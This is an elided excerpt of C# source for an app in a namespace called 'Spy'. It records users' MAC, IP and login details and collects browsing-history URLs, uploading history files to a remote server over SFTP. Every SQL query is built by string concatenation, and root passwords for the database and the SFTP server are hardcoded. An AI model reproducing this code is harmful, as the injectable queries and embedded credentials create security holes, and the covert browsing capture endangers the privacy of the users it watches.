...
namespace Spy
{
    public partial class Main : Form
    {
        ...
        private void Main_Load(object sender, EventArgs e)
        {
            ...
            String Strconn = "Database=spy;Data Source=localhost;User Id=root;Password=123456;pooling=true;CharSet=utf8;port=3306"; //链接数据库
            MySqlConnection conn = new MySqlConnection(Strconn);
            conn.Open();//打开数据库
            MySqlCommand cmd = conn.CreateCommand();
            cmd.CommandText = "select * from user where user=" + '"' + username + '"';
            ...
            cmd.CommandText = "select * from mac_cid where mac=" + '"' + MacAddress + '"'; //创建查询语句
            //从数据库中读取数据流存入reader中  
            ...
            if (reader.Read())
            {
                ...
                reader.Dispose();
                cmd.CommandText = "select * from user_LoginInfo where cid=" + '"' + cid + '"';
                reader = cmd.ExecuteReader();
             if (reader.Read())
                {
                    reader.Dispose();
                    cmd.CommandText = "update user_LoginInfo set isOnline=" + '"' + "1" + '"' + ",ip=" + '"' + IpAddress + '"' + ",department=" + '"' + department + '"' + ",userName=" + '"' + userName + '"' + "where cid=" + '"' + cid + '"';
                    cmd.ExecuteNonQuery();
                    cmd.CommandText = "select * from user where user=" + '"' + username + '"';
                    reader = cmd.ExecuteReader();
                    reader.Read();
                    ...
                    {
                        reader.Dispose();
                        cmd.CommandText = "update user set isRegist=" + '"' + "1" + '"' + "where user=" + '"' + username + '"';
                        cmd.ExecuteNonQuery();
                    }
                ...
                {
                    reader.Dispose();
                    cmd.CommandText = "insert into user_LoginInfo values(" + cid + "," + '"' + IpAddress + '"' + "," + '"' + department + '"' + "," + '"' + username + '"' + "," + "1" + ")";
                    cmd.ExecuteNonQuery();
                    cmd.CommandText = "update user set isRegist=" + '"' + "1" + '"' + "where user=" + '"' + username + '"';
                    cmd.ExecuteNonQuery();
                }
            ...
            {
                reader.Dispose();
                cmd.CommandText = "insert into mac_cid values(" + '"' + MacAddress + '"' + ",null)";
                cmd.ExecuteNonQuery();
                cmd.CommandText = "select * from mac_cid where mac=" + '"' + MacAddress + '"'; //创建查询语句
                reader = cmd.ExecuteReader();
                if (reader.Read())
        ...
        void Httpup()
        {
            ...
            var upload = new Spy.background.SFTPOperation("172.18.13.118", "22", "root", "Zhang7890078");
            if (System.IO.File.Exists(exepath + @"\net\httphistory" + nettxtnum + ".txt") == true)
            {
                nettxtnum++;
            }
            ...
            try
            {
                ...
                if (flag == 0)
                {
                    ...
                    conn.Open();//打开数据库  
                    MySqlCommand cmd = conn.CreateCommand();
                    cmd.CommandText = "select * from net_record where userName=" + '"' + Spy.Main.user + '"' + "and Date=" + '"' + DateTime.Now.ToString("yyyy-MM-dd") + '"'; //创建查询语句
                    ...
                    else
                    {
                        ...
                        reader.Dispose();
                        cmd.CommandText = "insert into net_record values(null," + '"' + Spy.Main.user + '"' + "," + '"' + DateTime.Now.ToString("yyyy-MM-dd") + '"' + "," + '"' + url + '"' + ")";
                        cmd.ExecuteNonQuery();
